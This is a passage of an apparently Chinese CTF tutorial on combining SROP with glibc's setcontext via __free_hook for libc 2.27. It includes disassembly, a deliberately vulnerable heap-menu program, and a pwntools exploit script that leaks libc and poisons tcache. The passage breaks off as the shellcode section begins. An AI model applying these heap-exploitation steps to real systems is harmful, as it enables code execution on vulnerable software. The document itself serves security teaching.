<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="345f7f7f98f69353e491aac32f382c24">srop搭配高低版本的setcontext</h1>
<p>srop技术想来大家应该都是相当熟悉了，它是利用signal 机制，这是一种类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。</p>
<p>其中涉及内核，但是我觉得学到这里的师傅们应该都对其有所了解，简单来说就是利用内核中的一个部分，起到控制所有寄存器的效果</p>
<p>相对应的，我们的libc里面也有一个很类似的函数，setcontext，我们可以看一下样子</p>
<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">info</span> <span class="n">address</span> <span class="n">setcontext</span>
<span class="n">Symbol</span> <span class="s">"setcontext"</span> <span class="n">is</span> <span class="n">at</span> <span class="mh">0x7fab8d034c80</span> <span class="n">in</span> <span class="n">a</span> <span class="n">file</span> <span class="n">compiled</span> <span class="n">without</span> <span class="n">debugging</span><span class="p">.</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">u</span> <span class="mh">0x7fab8d034c80</span> <span class="mi">20</span>
 <span class="err">►</span> <span class="mh">0x7fab8d034c80</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">&gt;</span>        <span class="n">push</span>   <span class="n">rdi</span>
   <span class="mh">0x7fab8d034c81</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span>      <span class="n">lea</span>    <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x128</span><span class="p">]</span>
   <span class="mh">0x7fab8d034c88</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>      <span class="n">xor</span>    <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>               <span class="n">EDX</span> <span class="o">=&gt;</span> <span class="mi">0</span>
   <span class="mh">0x7fab8d034c8a</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="mi">2</span>                 <span class="n">EDI</span> <span class="o">=&gt;</span> <span class="mi">2</span>
   <span class="mh">0x7fab8d034c8f</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r10d</span><span class="p">,</span> <span class="mi">8</span>                <span class="n">R10D</span> <span class="o">=&gt;</span> <span class="mi">8</span>
   <span class="mh">0x7fab8d034c95</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mh">0xe</span>               <span class="n">EAX</span> <span class="o">=&gt;</span> <span class="mh">0xe</span>
   <span class="mh">0x7fab8d034c9a</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>     <span class="n">syscall</span>
   <span class="mh">0x7fab8d034c9c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>     <span class="n">pop</span>    <span class="n">rdi</span>
   <span class="mh">0x7fab8d034c9d</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;</span>     <span class="n">cmp</span>    <span class="n">rax</span><span class="p">,</span> <span class="o">-</span><span class="mh">0xfff</span>
   <span class="mh">0x7fab8d034ca3</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;</span>     <span class="n">jae</span>    <span class="n">setcontext</span><span class="o">+</span><span class="mi">128</span>              <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>

   <span class="mh">0x7fab8d034ca5</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cac</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>     <span class="n">fldenv</span> <span class="p">[</span><span class="n">rcx</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cae</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">46</span><span class="o">&gt;</span>     <span class="n">ldmxcsr</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x1c0</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cb5</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rsp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cbc</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cc3</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cc7</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r12</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">]</span>
   <span class="mh">0x7fab8d034ccb</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r13</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">]</span>
   <span class="mh">0x7fab8d034ccf</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">79</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r14</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cd3</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">r15</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cd7</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cde</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;</span>     <span class="n">push</span>   <span class="n">rcx</span>
   <span class="mh">0x7fab8d034cdf</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">95</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>
   <span class="mh">0x7fab8d034ce3</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">99</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cea</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">106</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cf1</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">r8</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cf5</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">r9</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cf9</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">121</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">]</span>
   <span class="mh">0x7fab8d034cfd</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;</span>    <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                            <span class="n">EAX</span> <span class="o">=&gt;</span> <span class="mi">0</span>
   <span class="mh">0x7fab8d034cff</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;</span>    <span class="n">ret</span>
   <span class="mh">0x7fab8d034d00</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">128</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x36b161</span><span class="p">]</span>     <span class="n">RCX</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x7fab8d39fe68</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mh">0xffffffffffffff80</span>
   <span class="mh">0x7fab8d034d07</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;</span>    <span class="n">neg</span>    <span class="n">eax</span>
   <span class="mh">0x7fab8d034d09</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">137</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="nl">fs</span><span class="p">:[</span><span class="n">rcx</span><span class="p">],</span> <span class="n">eax</span>
   <span class="mh">0x7fab8d034d0c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;</span>    <span class="n">or</span>     <span class="n">rax</span><span class="p">,</span> <span class="mh">0xffffffffffffffff</span>
   <span class="mh">0x7fab8d034d10</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;</span>    <span class="n">ret</span>
</pre></div>
<p>这是在gdb里面查看的setcontext函数，可以看到，在从setcontext加53的位置开始，就会依次通过rdi指向的位置，来给所有寄存器，除了rax赋值，事实上，rax在这个函数返回前，固定被设置成0</p>
<p>这个时候我们又要</p>
<p>提到free hook这个函数，大家都知道free hook函数里面有数据的时候，free的时候会先执行这个这个函数</p>
<p>我们来看一下free函数的源代码</p>
<div class="highlight"><pre><span></span><span class="mh">0x7fab8d3beb71</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span>             <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x20d550</span><span class="p">]</span>     <span class="n">RBX</span><span class="p">,</span> <span class="p">[</span><span class="n">alloc_last_block</span><span class="p">]</span>
   <span class="mh">0x7fab8d3beb78</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>             <span class="n">cmp</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">rdi</span>
   <span class="mh">0x7fab8d3beb7b</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;</span>            <span class="n">je</span>     <span class="n">free</span><span class="o">+</span><span class="mi">16</span>                     <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>

   <span class="mh">0x7fab8d3beb7d</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;</span>            <span class="n">pop</span>    <span class="n">rbx</span>
   <span class="mh">0x7fab8d3beb7e</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span>            <span class="n">ret</span>
   <span class="mh">0x7fab8d3beb7f</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;</span>            <span class="n">nop</span>
   <span class="mh">0x7fab8d3beb80</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>            <span class="n">mov</span>    <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x20d551</span><span class="p">]</span>     <span class="n">RDX</span><span class="p">,</span> <span class="p">[</span><span class="n">alloc_ptr</span><span class="p">]</span>
   <span class="mh">0x7fab8d3beb87</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">23</span><span class="o">&gt;</span>            <span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span> <span class="n">rbx</span>
   <span class="mh">0x7fab8d3beb8a</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>            <span class="n">xor</span>    <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>                            <span class="n">ESI</span> <span class="o">=&gt;</span> <span class="mi">0</span>
   <span class="mh">0x7fab8d3beb8c</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>            <span class="n">sub</span>    <span class="n">rdx</span><span class="p">,</span> <span class="n">rbx</span>
   <span class="mh">0x7fab8d3beb8f</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">31</span><span class="o">&gt;</span>            <span class="n">call</span>   <span class="n">memset</span>                      <span class="o">&lt;</span><span class="n">memset</span><span class="o">&gt;</span>

   <span class="mh">0x7fab8d3beb94</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>            <span class="n">mov</span>    <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x20d53d</span><span class="p">],</span> <span class="n">rbx</span>
   <span class="mh">0x7fab8d3beb9b</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">43</span><span class="o">&gt;</span>            <span class="n">pop</span>    <span class="n">rbx</span>
   <span class="mh">0x7fab8d3beb9c</span> <span class="o">&lt;</span><span class="n">free</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>            <span class="n">ret</span>
</pre></div>
<p>这里看的可能不是很明显，但是换成静态汇编就比较明显</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235050-6e0d3d0c-8268-1.png"/></p>
<p>在把rdi改成当前堆块地址之后，才会去调用free hook函数，这是时候就会产生利用的地方了，想想看，如果我们在堆块里面布置好SigreturnFrame结构体，就可以搭配setcontext达到几乎为所欲为的效果。除了rax不可以修改，剩下都可以修改，我们来用题目演示一下</p>
<h2 data-content="1" id="b17abfc87e5b9c8b7f9d51e0dbcc1cfb">2.29以下</h2>
<p>setcontext有两种结构，根据版本的高低，上面演示的是低版本的setcontext，我们先以它为例</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"1. add chunk"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"2. delete chunk"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"3. edit chunk"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"4. show chunk"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"5. exit"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"choice:"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_num</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">add_chunk</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"size:"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
    <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">delete_chunk</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">edit_chunk</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"length:"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"content:"</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">length</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">show_chunk</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
    <span class="n">puts</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">menu</span><span class="p">();</span>
        <span class="k">switch</span> <span class="p">(</span><span class="n">get_num</span><span class="p">())</span> <span class="p">{</span>
            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
                <span class="n">add_chunk</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
                <span class="n">delete_chunk</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
                <span class="n">edit_chunk</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
                <span class="n">show_chunk</span><span class="p">();</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
            <span class="k">default</span><span class="o">:</span>
                <span class="n">puts</span><span class="p">(</span><span class="s">"invalid choice."</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>这是题目源代码，为了方便演示，几乎常见的漏洞都会有，使用gcc编译一下程序</p>
<pre><code>gcc pwn.c -o pwn -g</code></pre>
<p>我这里的libc版本是2.27</p>
<p>首先简单的逆向和泄露libc，都是相当简单的操作，我这里就不在过多赘述</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s2">"linux"</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"libc.so.6"</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/ld-linux-x86-64.so.2"</span><span class="p">,</span> <span class="s2">"./pwn"</span><span class="p">],</span>
            <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">"LD_PRELOAD"</span><span class="p">:</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/libc.so.6"</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"length:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"content:"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x7f</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3afca0</span>
<span class="n">info</span><span class="p">(</span><span class="s2">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</pre></div>
<p>利用largebin去泄露就可以了，重点其实放在后面的伪造上面</p>
<p>我们接利用tcachebins，去任意地址申请，申请到free_hook的位置</p>
<div class="highlight"><pre><span></span><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241004235117-7e190b7c-8268-1.png"/></p>
<p>这样的话，我们连续申请两个大小为0x400堆块，申请的第二个堆块就会申请到free_hook，对它进行编辑就会编辑到free_hook</p>
<p>然后放入我们的第一段shellcode</p>
<div class="highlight"><pre><span></span><span class="n">shellcode1</span> <span class="o">=</span> <span class="s1">'''</span>
